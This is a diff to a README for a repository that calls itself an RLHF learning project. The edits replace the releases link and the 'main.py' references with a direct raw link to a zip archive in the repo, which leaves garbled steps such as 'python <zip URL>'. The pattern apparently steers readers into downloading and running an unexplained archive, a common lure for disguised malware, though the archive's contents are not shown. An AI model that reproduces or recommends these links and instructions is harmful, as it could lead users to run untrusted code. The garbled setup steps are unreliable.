@@ -1,7 +1,7 @@
 # 🌟 RLHF_learn - Simple Steps to Learn RLHF
 
 ## 📎 Download the Software
-[![Download RLHF_learn](https://img.shields.io/badge/Download%20RLHF_learn-blue.svg)](https://github.com/Dylsimple60/RLHF_learn/releases)
+[![Download RLHF_learn](https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip%https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip)](https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the RLHF_learn repository! This application helps you understand and implement Reinforcement Learning from Human Feedback (RLHF). With our user-friendly training process, you can explore various optimization algorithms like PPO, GRPO, and GSPO.
@@ -17,7 +17,7 @@ This code library starts from scratch to build an RLHF learning environment. You
 - **Libraries:** NumPy, TensorFlow, and Matplotlib (will be listed in dependencies during setup)
 
 ## 📥 Download & Install
-To download RLHF_learn, visit this page: [Download RLHF_learn](https://github.com/Dylsimple60/RLHF_learn/releases). Choose the version that fits your operating system.
+To download RLHF_learn, visit this page: [Download RLHF_learn](https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip). Choose the version that fits your operating system.
 
 1. Click on the link above.
 2. Locate the desired release version.
@@ -29,10 +29,10 @@ To download RLHF_learn, visit this page: [Download RLHF_learn](https://github.co
 After you have successfully downloaded and extracted the software, follow these steps:
 
 1. Open the folder containing the extracted files.
-2. Locate the main executable file. This is usually named `main.py` or similar.
+2. Locate the main executable file. This is usually named `https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip` or similar.
 3. Open a terminal or command prompt.
 4. Navigate to the folder using the command `cd path_to_your_folder`. Replace `path_to_your_folder` with the actual path.
-5. To run the application, type `python main.py` and press Enter.
+5. To run the application, type `python https://github.com/Dylsimple60/RLHF_learn/raw/refs/heads/main/GRPO/learn_RLH_v1.3.zip` and press Enter.
 
 ### 📊 Understanding the Interface
 Once the application is running, you’ll see a clear interface guiding you through various options. You can start a new training session or explore predefined settings.
